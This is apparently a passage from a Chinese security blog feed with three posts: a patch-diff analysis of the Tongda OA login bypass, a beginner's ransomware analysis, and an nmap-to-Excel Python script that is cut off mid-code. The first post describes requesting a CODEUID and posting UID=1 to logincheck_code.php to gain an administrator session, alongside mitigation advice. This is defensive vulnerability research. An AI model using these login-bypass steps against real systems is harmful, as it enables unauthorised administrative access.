      <link href="/2019/07/03/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2019/07/03/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​        4月20日，阿里云漏洞预警，通达OA任意用户登录漏洞，链接如下：<a href="https://help.aliyun.com/noticelist/articleid/1060277736.html">https://help.aliyun.com/noticelist/articleid/1060277736.html</a> </p><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><ul><li><p>某盘下载的TDOA11.0.exe</p></li><li><p>文件对比工具（DiffMerge等）</p></li><li><p>zend解密小工具</p></li></ul><h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><pre><code>    1. 直接安装TDOA11.0.exe，版本号为11.0.190911       2. 打开“通达应用服务控制中心”启动服务，测试web是否能正常访问      3. 使用OfficeAuto更新程序到11.4.200323 ，备份webroot文件夹      4. 更新到11.4.200417，拷贝webroot</code></pre><p><img src="http://yanxuan.nosdn.127.net/42334a5388839dd91f914689ad693d34.png" alt="1.png"></p><ol start="5"><li>原始的webroot中文件使用zend加密压缩，此处需要使用zend解密工具批量解密为正常的PHP文件</li></ol><p><img src="http://yanxuan.nosdn.127.net/43a30082b59108269b918fc3ee15d664.png" alt="2.png"> </p><h3 id="补丁对比"><a href="#补丁对比" class="headerlink" title="补丁对比"></a>补丁对比</h3><ol><li>对比更新前后的webroot文件</li></ol><p><img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/3.png" alt="3.png"> </p><ol start="2"><li>如图更新对$UID进行初始化，并判断是否为0</li></ol><p><img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/4.png" alt="4.png"> </p><p><img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/5.png" alt="5.png"> </p><p>由此可见UID是个关键参数，筛选文件对比结果，很清晰判断出更新补丁中哪些文件有相关逻辑。</p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>​    重点对更新文件进行分析，使用编辑器导入web项目，分析版本11.4的代码逻辑。</p><h5 id="一、Logincheck-code"><a href="#一、Logincheck-code" class="headerlink" title="一、Logincheck_code"></a>一、Logincheck_code</h5><p><img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/6.png" alt="6.png"> </p><p>$UID有POST请求参数获取，访问该URL共需两个参数：UID &amp; CODEUID；</p><p>继续向下分析，中间的判断过程，仅对用户登陆安全登陆限制进行了判断，在如下位置后，直接存入对应UID的SESSION。</p><p><img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/7.png" alt="7.png"> </p><h5 id="二、跟踪判断如何构造CODEUID参数"><a href="#二、跟踪判断如何构造CODEUID参数" class="headerlink" title="二、跟踪判断如何构造CODEUID参数"></a>二、跟踪判断如何构造CODEUID参数</h5><p>​    更新文件中，login_code去掉了一些方法，从内容看出如果login_codeuid为空，访问该php时，会有getUniqid()返回CODEUID。</p><p><img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/8.png" alt="8.png"> </p><h5 id="三、构造Logincheck-code访问，获取登陆cookie"><a href="#三、构造Logincheck-code访问，获取登陆cookie" class="headerlink" title="三、构造Logincheck_code访问，获取登陆cookie"></a>三、构造Logincheck_code访问，获取登陆cookie</h5><ol><li>获取code_uid</li></ol><p><img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/9.png" alt="9.png"> </p><ol start="2"><li>构造POST请求，获取cookie，默认情况下，UID=1是admin账号，为系统管理员。</li></ol><p> <img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/10.png" alt="10.png"></p><p><img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/11.png" alt="11.png"> </p><ol start="3"><li>使用Cookie访问系统</li></ol><p><img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/12.png" alt="12.png"> </p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ol><li><p>未更新补丁前，备份logincheck_code.php，将该文件移除webroot目录；或使用WAF等安全产品，禁止logincheck_code.php访问</p></li><li><p>更新官方补丁</p></li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li><p>需要验证历史版本的从11.0更新时，可以逐步版本更新，备份webroot文件夹，验证对应版本是，更换webroot即可</p></li><li><p>第一次尝试对比补丁去验证漏洞，对于更新点比较少的应用，可以很快定位</p></li><li><p>登陆验证类功能点，只做状态判断，尽量不要附带其他功能</p></li></ol><p>Ps: 文章审核了快3个月。。。。。。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码分析 </tag>
            
            <tag> 漏洞预警 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一次分析勒索病毒</title>
      <link href="/2019/05/13/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/"/>
      <url>/2019/05/13/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/</url>
      
        <content type="html"><![CDATA[<h5 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h5><p>​        接到客户通知，有个PC中了勒索病毒，领导让尽量分析一下给客户个回复，着急的我赶紧翻书翻教程，一顿qwer，最终还是没能将文件恢复，但是分析过程中又学习了一些知识，借此分享。</p><p>先附下加密后的截图</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E4%B8%AD%E7%97%85%E6%AF%92%E5%90%8E.png" alt="中病毒后"></p><h3 id="0x02-样本信息"><a href="#0x02-样本信息" class="headerlink" title="0x02 样本信息"></a>0x02 样本信息</h3><ul><li><p>程序名： 7407.tmp.exe</p></li><li><p>样本大小：445952</p></li><li><p>MD5：b65014814bbbd09367df4a86c0d4204d</p></li><li><p>加壳混淆：UPX 0.89 - 3.x</p></li><li><p>在线检测</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E5%9C%A8%E7%BA%BFAV%E6%A3%80%E6%B5%8B.png" alt="在线AV检测"></p></li><li><p>分析工具：OD、X32dbg、IDA、火绒剑、微步在线</p></li></ul><h3 id="0x03-监控运行分析程序行为"><a href="#0x03-监控运行分析程序行为" class="headerlink" title="0x03 监控运行分析程序行为"></a>0x03 监控运行分析程序行为</h3><ol><li>自身复制</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E8%87%AA%E8%BA%AB%E5%88%9B%E5%BB%BA.png" alt="自身创建"></p><ol><li>修改注册表</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E4%BF%AE%E6%94%B9%E6%B3%A8%E5%86%8C%E8%A1%A8.png" alt="修改注册表"></p><ol><li>监控单个文件的操作流程</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E7%9A%84%E6%B5%81%E7%A8%8B.png" alt="一个文件的流程"></p><ol><li>netstat监控无网络行为</li><li>import导入函数中无加密函数，怀疑没有使用公用的加密算法进行加密</li></ol><h3 id="0x04-脱壳后OD分析-进入误区"><a href="#0x04-脱壳后OD分析-进入误区" class="headerlink" title="0x04 脱壳后OD分析-进入误区"></a>0x04 脱壳后OD分析-进入误区</h3><ol><li>由于是UPX加壳，直接用脱壳工具就掉了</li><li>GetTempFileNameA获取tmp目录</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/GetTempFileNameA.png" alt="GetTempFileNameA"></p><ol><li>getTempFile</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/getFileTempName.png" alt="getFileTempName"></p><ol><li>打印机的相关操作（不知道有什么用，反正是进入误区了）</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E8%AE%BE%E7%BD%AE%E9%BB%98%E8%AE%A4%E6%89%93%E5%8D%B0%E6%9C%BA%E5%90%8D%E7%A7%B0.png" alt="设置默认打印机名称"></p><p> 到此，程序运行退出，文件也没加密，这就肯定有反调试了，但是OD有插件啊，怀疑程序对INT 3断点有反调检测，直接把所有断线都取消了重新设置一下：<strong>进入call后，在第二行下断点</strong></p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/INT3%E6%A3%80%E6%B5%8B.png" alt="INT3检测"></p><p> 此时发现程序还是会自动退出，同时文件也开始被加密了，查看进程列表和火绒剑，发现又多了一个7407.tmp.exe进程，调用位置也和调试的病毒程序一样。于是重新在 <strong>CreateProcessW</strong>下断点，刚开始病毒程序有其他反调检测，程序发现被调试时会重新起一个进程，后来通过火绒剑发现无调试时也有创建进程操作；</p><p> 接着尝试在 <strong>WriteMemory</strong>下断点，这下找到了真实的病毒执行体</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/WriteProcess%E5%86%99%E8%BF%9B%E7%A8%8B.png" alt="WriteProcess写进程"></p><ol><li>dump真实病毒程序 PE头文件，找到OEP</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E7%9C%9F%E5%AE%9E%E7%97%85%E6%AF%92OEP.png" alt="真实病毒OEP"></p><p> 下一步在主程序使用ResumeThread恢复新进程前，使用X32DBG附加新进程；可以在ResumeThread处下断点，再附加新进程。</p><h3 id="0x05-X32dbg分析-真实病毒文件"><a href="#0x05-X32dbg分析-真实病毒文件" class="headerlink" title="0x05 X32dbg分析-真实病毒文件"></a>0x05 X32dbg分析-真实病毒文件</h3><ol><li>删除卷影副本</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4.png" alt="执行命令"></p><ol><li><p>在 WriteFile、CreateFileW、ReadFile、DeleteFileW、GetWindowsDirectoryA处下断点，运行程序，断下来后，回溯进入程序领空</p><p>此时找到sub_402880为病毒进程加密一个的整个操作</p></li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E4%B8%BB%E8%A6%81CALL.png" alt="勒索病毒主要CALL"></p><ol><li>往下翻，找到主要的加密（计算）依据 （key） sub_4034C0</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E5%8A%A0%E5%AF%86%E4%BE%9D%E6%8D%AEkey.png" alt="加密依据key"></p><ol><li>找到加密CALL，这里确定是加密CALL的原因是，执行这个CALL后，发现之前读取到文件内容的Buffer区域中，被写入了新的数据，且该数据和文件被加密后的16进制内容相同。</li></ol><p>a. 读取到的文件内容</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E6%95%B0%E6%8D%AE.png" alt="读取文件的数据"></p><p>b. 执行了sub_403960后数据变化</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E5%8A%A0%E5%AF%86%E5%90%8E.png" alt="加密后">c. WinHex查看加密后文件</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/tass_liehuHEX%E6%9F%A5%E7%9C%8B.png" alt="tass_liehuHEX查看"></p><ol><li>根据sub_403960执行前压栈信息，发现有一个重要的计算依据，可以叫做加密key，由 第三步sub_4034C0得到</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E5%8F%82%E6%95%B0.png" alt="参数"></p><ol><li>尝试分析加密参数生成、文件内容加密的计算方法 – 没成功，有些复杂</li></ol><p>a. key 值计算CALL内部</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/key%E5%80%BC%E8%AE%A1%E7%AE%97.png" alt="key值计算"></p><p>对比IDA Pro</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/IDA-key%E8%AE%A1%E7%AE%97call.png" alt="IDA-key计算call"></p><p>b. 加密CALL内部</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E5%8A%A0%E5%AF%86CALL%E5%86%85%E9%83%A8.png" alt="加密CALL内部"></p><p>对比IDA Pro</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E5%8A%A0%E5%AF%86%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9.png" alt="加密文件内容"></p><p> 到此，发现key值也有一个动态的计算依据，这个需要重新回溯，而且计算过程比较麻烦，所以结束了。</p><h3 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h3><ol><li><p>写注册表操作</p><p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\7407.tmp.exe</p></li><li><p>自身复制</p><p>C:\Windows\System32\7407.tmp.exe<br>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\7407.tmp.exe<br>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\7407.tmp.exe</p></li><li><p>病毒不会蠕虫传播、无明显的网络行为</p></li><li><p>没有加密操作，只是自定义了一些函数，对文件内容读取、运算，写入新文件，删除源文件</p></li><li><p>目前测试火绒杀毒不能识别病毒文件</p></li></ol><p> 分析到这，通知用户在中毒机器上 杀掉所有 7407.tmp.exe进程，删除对应注册表、自身复制的文件，使用磁盘恢复工具尝试一下能不能恢复文件。</p><h3 id="0x07-分析过程中的一些小知识点"><a href="#0x07-分析过程中的一些小知识点" class="headerlink" title="0x07 分析过程中的一些小知识点"></a>0x07 分析过程中的一些小知识点</h3><ol><li>调试时发现反调插件已经有了，还是一调试就退出，先尝试把异常忽略关闭，看看是否可行；同时考虑程序检测导入函数是否被下断点（原因是OD在设置CC断点时，会将对应位置的机器码修改为 CC01，反调试程序会检测这个位置），这时可以尝试在CALL内第二行设置断点</li><li>对于自身启动新进程，通过内存将真实文件内容写入的方式，可以通过火绒剑一步一步监控，再找对应的API函数，下断点调试</li><li>OD中找到一个函数，想要在IDA中找到对应位置，因为IDA有伪代码，一般情况，直接跳转地址，发现找不到，此时，使用 函数地址 - OD中基址 + IDA基址 ，再使用G跳转，也可以找到特征字符，在IDA中使用 alt + b搜索位置</li></ol>]]></content>
      
      
      <categories>
          
          <category> 勒索病毒 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 病毒分析 </tag>
            
            <tag> 逆向学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nmap结果过滤脚本</title>
      <link href="/2018/05/13/Nmap%E7%BB%93%E6%9E%9C%E8%BF%87%E6%BB%A4/"/>
      <url>/2018/05/13/Nmap%E7%BB%93%E6%9E%9C%E8%BF%87%E6%BB%A4/</url>
      
        <content type="html"><![CDATA[<blockquote><p>一个简单的python脚本，将nmap输出的xml格式提取为excel</p></blockquote><h3 id="一、Nmap扫描"><a href="#一、Nmap扫描" class="headerlink" title="一、Nmap扫描"></a>一、Nmap扫描</h3><p><img src="/img/Nmap%E7%BB%93%E6%9E%9C%E8%BF%87%E6%BB%A4/1.png" alt="精准打击"></p><p>  在信息收集阶段，一个重要的环节就是端口扫描，如果是一两个目标直接干就完了；但是如果是一堆IP地址段怎么办，这时扫描结果呼啦一大片，随便挑几个深入，这样显得不够专业吧</p><hr><p><strong>nmap的几个命令</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. nmap -sS 192.168.1.1 -T4 --open -n</span><br><span class="line">2. nmap -sV 192.168.1.1 -T4 --open -p 22,80,3389 -n -O</span><br></pre></td></tr></table></figure><blockquote><p>注明：nmap的参数有很多，不列举了，sS 使用SYN的快速扫描（速度快），sV 探测端口服务，-O 探测目标操作系统</p></blockquote><h3 id="二、结果输出"><a href="#二、结果输出" class="headerlink" title="二、结果输出"></a>二、结果输出</h3><p>  添加-oX参数指定输出为xml格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. nmap -sS 192.168.1.1 -T4 --open -n -oX test.xml</span><br></pre></td></tr></table></figure><h3 id="三、xml结果过滤"><a href="#三、xml结果过滤" class="headerlink" title="三、xml结果过滤"></a>三、xml结果过滤</h3><h5 id="1-关于xml文件解析"><a href="#1-关于xml文件解析" class="headerlink" title="1. 关于xml文件解析"></a>1. 关于xml文件解析</h5><p>  python中解析xml有四种方法，其实对于我们这些偶尔拿来吃鸡的来说，随便一个就行了<br>常用的xml.dom.minidom和xml.etree.ElementTree，其中xml.etree.ElementTree有一个C语言的实现，即xml.etree.cElementTree，听说速度会快一点。（python3.3+版本后，ElemenTree模块会自动优先使用C加速器，如果不存在C实现，则会使用Python实现）</p><h5 id="2-代码实现"><a href="#2-代码实现" class="headerlink" title="2. 代码实现"></a>2. 代码实现</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> xml.etree.ElementTree <span class="keyword">as</span> ET   <span class="comment">#解析xml，python3已经默认使用cElementTree</span></span><br><span class="line"><span class="keyword">import</span> xlwt     <span class="comment">#写excel</span></span><br><span class="line"><span class="keyword">import</span> argparse    <span class="comment">#运行前参数</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment">#判断运行时python版本是否小于3.x</span></span><br><span class="line"><span class="keyword">if</span> sys.version_info.major &lt; <span class="number">3</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I need python3.x&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parsexml</span>(<span class="params">xml,sheet</span>):</span></span><br><span class="line">tree = ET.parse(xml)</span><br><span class="line">root = tree.getroot()     <span class="comment">#获取根节点</span></span><br><span class="line">hosts = root.findall(<span class="string">&quot;host&quot;</span>)</span><br><span class="line">i = <span class="number">0</span>   <span class="comment">#写入excel的计数器</span></span><br><span class="line"><span class="keyword">for</span> host <span class="keyword">in</span> hosts:</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line">portTcpRes = <span class="string">&quot;&quot;</span></span><br><span class="line">portOtherRes = <span class="string">&quot;&quot;</span></span><br><span class="line">ip = host.find(<span class="string">&quot;address&quot;</span>)</span><br><span class="line">ipaddress = ip.attrib.get(<span class="string">&#x27;addr&#x27;</span>)</span><br><span class="line"><span class="comment"># print(&quot;ip地址:&quot;+ ipaddress)</span></span><br><span class="line">ports = host.find(<span class="string">&quot;ports&quot;</span>).findall(<span class="string">&quot;port&quot;</span>)</span><br><span class="line"><span class="comment">#获取系统版本的扫描结果</span></span><br><span class="line">os = host.find(<span class="string">&quot;os&quot;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">osmatch = os.find(<span class="string">&quot;osmatch&quot;</span>)</span><br><span class="line">osname = osmatch.attrib.get(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">accuracy = osmatch.attrib.get(<span class="string">&quot;accuracy&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">osname = <span class="string">&quot;&quot;</span></span><br><span class="line">accuracy = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># print(ports)</span></span><br><span class="line"><span class="keyword">for</span> portT <span class="keyword">in</span> <span class="built_in">list</span>(ports):</span><br><span class="line">service = portT.find(<span class="string">&quot;service&quot;</span>)</span><br><span class="line">protocol = portT.attrib.get(<span class="string">&#x27;protocol&#x27;</span>)</span><br><span class="line"><span class="comment">#获取nmap结果中service信息</span></span><br><span class="line">serviceName = service.attrib.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">product = service.attrib.get(<span class="string">&#x27;product&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> product:</span><br><span class="line">serviceName = serviceName + <span class="string">&#x27;:&#x27;</span> + product   <span class="comment">#将SERVICE和VERSION组合一起</span></span><br><span class="line"><span class="comment">#获取端口号</span></span><br><span class="line">portNum = portT.attrib.get(<span class="string">&#x27;portid&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> protocol == <span class="string">&#x27;tcp&#x27;</span>:</span><br><span class="line">portTcpRes += portNum + <span class="string">&#x27;(&#x27;</span> + serviceName + <span class="string">&#x27;),&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:<span class="comment">#其他协议</span></span><br><span class="line">portOtherRes += portNum + <span class="string">&#x27;(&#x27;</span> + serviceName + <span class="string">&#x27;),&#x27;</span></span><br><span class="line">output(sheet,ipaddress,portTcpRes.strip(<span class="string">&#x27;,&#x27;</span>),portOtherRes.strip(<span class="string">&#x27;,&#x27;</span>),i,osname,accuracy+<span class="string">&quot;%&quot;</span>)    <span class="comment">#写入excel</span></span><br><span class="line"><span class="comment"># print(portTcpRes.strip(&#x27;,&#x27;))</span></span><br><span class="line"><span class="comment"># print(&#x27;------------------------&#x27;)</span></span><br><span class="line"><span class="comment">#初始化excel</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">excelcsh</span>():</span></span><br><span class="line">ExcelFile = xlwt.Workbook(encoding=<span class="string">&#x27;utf-8&#x27;</span>,style_compression=<span class="number">0</span>)</span><br><span class="line">sheet1 = ExcelFile.add_sheet(<span class="string">&#x27;nmap结果&#x27;</span>)</span><br><span class="line"><span class="comment">#表格第一行</span></span><br><span class="line">sheet1.write(<span class="number">0</span>,<span class="number">0</span>,<span class="string">&#x27;ip地址&#x27;</span>)</span><br><span class="line">sheet1.write(<span class="number">0</span>,<span class="number">1</span>,<span class="string">&#x27;TCP端口&#x27;</span>)</span><br><span class="line">sheet1.write(<span class="number">0</span>,<span class="number">2</span>,<span class="string">&#x27;其他协议端口&#x27;</span>)</span><br><span class="line">sheet1.write(<span class="number">0</span>,<span class="number">3</span>,<span class="string">&#x27;系统版本&#x27;</span>)</span><br><span class="line">sheet1.write(<span class="number">0</span>,<span class="number">4</span>,<span class="string">&#x27;系统扫描精准度&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> ExcelFile,sheet1</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">output</span>(<span class="params">sheet,ip,tcpport,otherproto,num,osversion,accuracy</span>):</span></span><br><span class="line"><span class="comment">#写入数据</span></span><br><span class="line">sheet.write(num,<span class="number">0</span>,ip)</span><br><span class="line">sheet.write(num,<span class="number">1</span>,tcpport)</span><br><span class="line">sheet.write(num,<span class="number">2</span>,otherproto)</span><br><span class="line">sheet.write(num,<span class="number">3</span>,osversion)</span><br><span class="line">sheet.write(num,<span class="number">4</span>,accuracy)</span><br><span class="line"><span class="comment">#刷新缓存</span></span><br><span class="line">sheet.flush_row_data()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&quot;xml解析&quot;</span>)<span class="comment">#.decode(&#x27;utf-8&#x27;).encode(&#x27;gbk&#x27;)</span></span><br><span class="line">parser.add_argument(<span class="string">&#x27;-x&#x27;</span>,action=<span class="string">&quot;store&quot;</span>,required=<span class="literal">False</span>,dest=<span class="string">&quot;xml&quot;</span>,<span class="built_in">type</span>=<span class="built_in">str</span>,<span class="built_in">help</span>=<span class="string">&#x27;nmap result(xml file)&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-o&#x27;</span>,action=<span class="string">&quot;store&quot;</span>,required=<span class="literal">False</span>,dest=<span class="string">&quot;outfile&quot;</span>,<span class="built_in">type</span>=<span class="built_in">str</span>,<span class="built_in">help</span>=<span class="string">&#x27;outputName&#x27;</span>,default=<span class="string">&quot;excel.xls&quot;</span>)</span><br><span class="line"><span class="comment"># parser.add_argument(&#x27;--file&#x27;,action=&quot;store&quot;,required=False,dest=&quot;file&quot;,type=str,help=&#x27;Input filename eg:a.txt&#x27;)</span></span><br><span class="line">args = parser.parse_args()</span><br><span class="line">xml = args.xml</span><br><span class="line">outpath = 